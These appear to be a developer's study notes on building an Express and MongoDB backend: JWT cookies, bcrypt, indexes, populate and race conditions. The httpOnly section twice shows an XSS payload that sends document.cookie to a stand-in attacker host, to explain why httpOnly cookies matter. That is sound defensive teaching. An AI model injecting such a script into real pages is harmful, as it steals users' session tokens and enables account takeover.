### RUNNING COMMANDS

## BACKEND

npm start - (uses nodemon) if this is given we dont need to stop and restart the server, after any changes in code and as soon as saved, it does that itself

node src/app.js - in this command we have to do it manually

npm i express

running epress/node files node src/app.js

using mongoose to talk to mongodb database

built basic apis, but data sanitation is needed.

Never in your life trust request body.

using validator npm library for data validation (in schema) before entering data into database.

using bcrypt npm package for storing passwords.

we need a cookie parser to parse read a cookie,we cant read or parse it diectly, for it we use a npm library
it is a middleware...similar to expresss.json()
npm i cookie-parser

we are using jsonwebtoken npm library to create jwt token
everytime a new token is created when we login..a jwt token has 3 parts (header.data we want to send.dgital signature fro veriification)
we are only concerned with the data

creating jwt token
jwt.sign(payload, secretOrPrivateKey)
the secret or private key is a must and it should only be known to th serer.we can any string as this key

Never share cookis with anyone

we can also add middleware like this
one way is app.use("/",(req,res,next)=>{})
the other one is, actually here the middlewareFunction will be applied like above only
app.get("/",middlewareFuncttion,(req,res)=>{})

while using middlewares like userAuth for checking user's login status,
we set user as req.user = user
and, which accessing it in HTTP method, we access it as req.user and not req.body.user

req.body is used only for those purposes where the data is sent by client, here in this case the data isnot sent by client, rather its sent by the midleware so req.user

The syntax of schema function is schemaName.methods.methodName
schema methods are always normal functions and not arrow functions

cookies workflow

User Logs In
↓
Server → Set-Cookie header
↓
Browser stores cookie
↓
User requests /profile
↓
Browser sends Cookie header automatically
↓
Express receives request
↓
cookie-parser reads req.headers.cookie
↓
cookie-parser sets req.cookies object
↓
userAuth middleware reads req.cookies.token
↓
JWT verify
↓
Access granted

why cookie parser isnot required in userAuth
because we use app.use(cookieparser())as a middleware
What cookie-parser actually does

When this runs:

app.use(cookieParser());

It internally does something like:

req.cookies = parsedCookiesObject;
next();

So now req contains:

req.cookies = {
token: "abc123"
}

have done unique:true in Users (which stores users data indivisually) just for email id, so the mongodb automatically
created a index using email ids, which improves query performance when database grows.
indexing is very important to improve query performance for large databases as, in large dbs, querrying becomes very slow
nd when a fieild which is unique helps in faster querrying.
we can even set firstname as index:true, so if in db there are 50 virat and we need to find one then finding indexing will help in finding the one virat out of 50 virats, and not between thousands and lakhs of users.
keep unique:true for indexed which are always unique like email ids, mobile nos.

populate and ref

ref is used to reference one or more enitities in one schema from other schemas.

The populate() method in Mongoose automatically replaces a referenced field (ObjectId) with the actual document from another collection. It makes working with related data easier by fetching linked documents in a single query, eliminating the need to manually query multiple collections.

while using reference (ref), we write name of refrenced model not schema name.ex: 'User' and not userSchema

while using populating, we write te entity namw as the first argument in populate method.
const data = await ConnectionRequest.find({
toUserId: user.\_id,
status: "interested",
}).populate('fromUserId',["firstName","lastName"]);

["firstName","lastName"] here we mention only those attributes what we need, no all ,else all data like email,pass,etc would come, which isnt required. so we mention the fields we need, it avoids over fetching of data

.save() mehtod automatically runs all validators defined in schema or somewhere else when data is being added or updated.
but the encrypted password is not running because the save() is checking the encrypted password strength and not the original plain text, so we need to check passowrd strength before data ios saved in db.

Inside try catch block, when we perfrom multiple checks, if there's an error and we dont put a return along with response, we get the error as "Cannot set headers after they are sent to the client"
because, even after there's an error, the appropritate responseis sent still, after that the code continues to run, so return is required.

### bug - Fixed

🔥 Real Interview Insight

What you just hit is one of the most common backend bugs.

If you say this in interview:

“I fixed ERR_HTTP_HEADERS_SENT by converting validation into middleware with next()”

### bug --Fixed

even after performing multiple checks, same user is getting created in db.
in response we get, user exists, but user with same email gets created each time signup with same credentials is done, but in response we get user already exists, also due to this reason facing issue in login.

mongodb throws code 11000 for duplicate enteries, in catch block mention them specifically

Initially:
Index NOT created yet ❌
exists() check failed due to race condition(when 2 users check for same user, both get null and both create, but multi user i havent implemented/it hasnt been tested yet)
Duplicate users got inserted
Later (automatically):
MongoDB finished creating the unique index
Now duplicates are blocked at DB level

So this error existed because i set unique:true was set after the db was created and some collections were added

### Why httpOnlt:true ?

In simp-le terms it does not allow javascript(frontend) to access the cookies
if we dont put {httpOnly:true} here res.cookie("token", token);
then, in website js console, document.cookie can simply expose our cookie by exposing JWT and with httpOnly, only server can access the cookie

Real Attack Scenario (XSS Attack)

Let’s say your site has a vulnerability:

<input type="text" />

Attacker injects:

<script>
  fetch("https://hacker.com/steal?cookie=" + document.cookie);
</script>

💥 What happens?
document.cookie contains your JWT
Hacker gets your token
They can:
Login as user
Access private data
Perform actions

👉 This is called XSS (Cross-Site Scripting)

✅ With httpOnly (SAFE)
res.cookie("token", token, {
httpOnly: true
});

Now:
document.cookie
token is NOT accessible

🛡️ Same attack now fails

<script>
  fetch("https://hacker.com/steal?cookie=" + document.cookie);
</script>

Cookie NOT included
Token stays safe

🔥 Why this matters (VERY IMPORTANT)

JWT is basically:

🔑 Your identity

If stolen:

User account compromised
Full access given
🧠 Key Insight (Interview Gold)

🔥 “httpOnly prevents client-side JavaScript from accessing cookies, protecting against XSS-based(cross site scripting) token theft.”

⚠️ Important Clarification

httpOnly does NOT protect against:

CSRF attacks (need sameSite)
Man-in-the-middle (need secure)

### DTO (Data Transfer Object) pattern

sanizeData is called DTO.It:
Control what data leaves backend
Hide internal fields
Improve security

### password change improvement -future

“Password change APIs must always verify the current password to prevent unauthorized account takeover.”

you should also ask user to enter their old password, when they want to changeit but in that case, password reset and forgot password wont work in same api

### race condition in connection Schema

currently/when we are not putting any index or compoubnd index in connectionSchema, and checking in api wether a request exists between 2 users.
it works when there is on;y 1 user,
ERROR/RACE Condition : When 2 users simultaneously call this api for same userid and senderid, then they wont find any req, and will create 2 same requests, this breaks the db, as 2 duplicate connection reqs are formed.
to handle this condition we should create a compound index on fromuserid and toUserid, so from A to B, only 1 status and req exists, but still B can send same req to A, for that we can check it through AP which we are implementing.
the check in db should also be present for aded security.

# compound indexes are direction sensitive

App-level vs DB-level validation

You did:

findOne(...)

👉 But this is NOT enough

💥 Race Condition Problem

Imagine:

Request 1 → checks DB → no record
Request 2 → checks DB → no record

👉 Both insert → duplicate ❌

✅ Real Solution (DB-level)
connectionRequestSchema.index(
{ fromUserId: 1, toUserId: 1 },
{ unique: true }
);

👉 MongoDB ensures:

Only ONE request allowed
📌 Question

“If fromUserId is same, will toUserId ever be same again? Do we really need to prevent duplicate requests?”

✅ Short Answer

❌ You cannot rely on user behavior
✔ Always enforce uniqueness at DB level

🧠 Core Concept

Backend systems should never trust client behavior.
Even if logically a user should not repeat an action, it can still happen due to real-world conditions.

💥 Why duplicates CAN happen
⚡ 1. Double Click / Rapid Click

User clicks “Send Request” multiple times quickly
→ Multiple API calls hit backend

⚡ 2. Network Retry

Frontend retries request automatically on failure
→ Same request sent again

⚡ 3. Multiple Tabs

User opens app in multiple tabs
→ Sends request from both

⚡ 4. Malicious API Calls

User directly hits API multiple times:

POST /request/send/interested/:id
POST /request/send/interested/:id
🚨 Key Insight

Even if your code checks:

await ConnectionRequest.findOne(...)

👉 This is NOT enough
👉 Because of race conditions

⚡ Race Condition Example
Request 1 → checks DB → no record
Request 2 → checks DB → no record

Both insert → duplicate created ❌
✅ Correct Approach (2 Layers)
1️⃣ Application Level Check
findOne(...) // prevents most duplicates
2️⃣ Database Level Constraint (MUST)
connectionRequestSchema.index(
{ fromUserId: 1, toUserId: 1 },
{ unique: true }
);

👉 DB guarantees uniqueness even in concurrency

⚠️ Important Edge Case

Your index:

{ fromUserId: 1, toUserId: 1 }

Prevents:

A → B duplicate ❌

BUT allows:

B → A ❌ (reverse still possible)
🧠 Solution for Reverse Case

Handled at application level:

$or: [
{ fromUserId: A, toUserId: B },
{ fromUserId: B, toUserId: A }
]
🎯 Final Takeaways
❌ Never assume “user won’t repeat action”
❌ App-level checks alone are not enough
✅ Always enforce DB-level uniqueness
✅ Handle reverse relationships in logic
💬 Interview-Level Answer

“Even if business logic prevents duplicate requests, I enforce uniqueness at the database level to handle race conditions and concurrent requests.”

🔥 One-Line Summary

Backend correctness = Logic + Database constraints

### "/request/review/:status/:requestId",

What this API represents (VERY IMPORTANT)

You just implemented:

🔥 State transition system

📊 Request Lifecycle
interested → accepted
interested → rejected

👉 No other transitions allowed

❌ Invalid transitions
accepted → rejected ❌
rejected → accepted ❌

👉 You prevented this via:

status: "interested"
🔥 Interview-Level Insight

You can say:

“I enforce state transitions at the query level to prevent invalid updates and ensure data consistency.”

### Future enhancement idea

when a user has rejected someones req, then there should be an option to send a req again by the sender but after some days like 1,2 or 7 days

### users/requests/received

“I fetch incoming connection requests by querying the ConnectionRequest collection filtered on toUserId and status, and populate sender details to avoid additional queries.”

###bug in /user/connections - api which fetches all connections (accepted)
in that api, if we write this logic
const connectionsData = await ConnectionRequest.find({
$or: [{ toUserId: user._id }, { fromUserId: user._id }],
status: "accepted",
}).populate("fromUserId", ["firstName", "lastName"]);
to check wether A has sent a req to b and the req is accepted by b, if we put fromUser and touserId same as user.\_id, then A is connection of b, so both of them should display their connections when api is called indivisually, but when we populate the data of sender, and the sender is itself loggedd in here suppose A(acc to ex given above), then we will populate the data of sender (here A) itself

    # Solution ---- “After populating user references, I extract the connected user by comparing IDs and returning the opposite node in the relationship.”

📌 Bug in /user/connections API

When fetching connections using:

ConnectionRequest.find({
$or: [{ toUserId: user._id }, { fromUserId: user._id }],
status: "accepted",
}).populate("fromUserId")
❌ Problem

If only fromUserId is populated:

When the logged-in user is the sender,
the populated data returns the user itself, not the connection.

Example:

A → B (accepted)
If A is logged in:
fromUserId = A → populated
API returns A instead of B ❌
🧠 Root Cause
Connection is stored as a directed edge
But we need to return it as an undirected relationship
✅ Solution

Populate both users and return the other user:

.populate("fromUserId toUserId")

Then:

const safeData = connectionsData.map((row) => {
if (row.fromUserId.\_id.toString() === user.\_id.toString()) {
return row.toUserId;
}
return row.fromUserId;
});
🎯 Key Insight

“After populating user references, extract the connected user by comparing IDs and returning the opposite node in the relationship.”

🔥 One-line Summary

Store connections as edges, return them as nodes.

# know about .select and .populate

### Doubt

if a and b both have sent req to c, and hile a is logged in, b intercepts a post req to see req sent, then b can get data of a , if b has user id of a
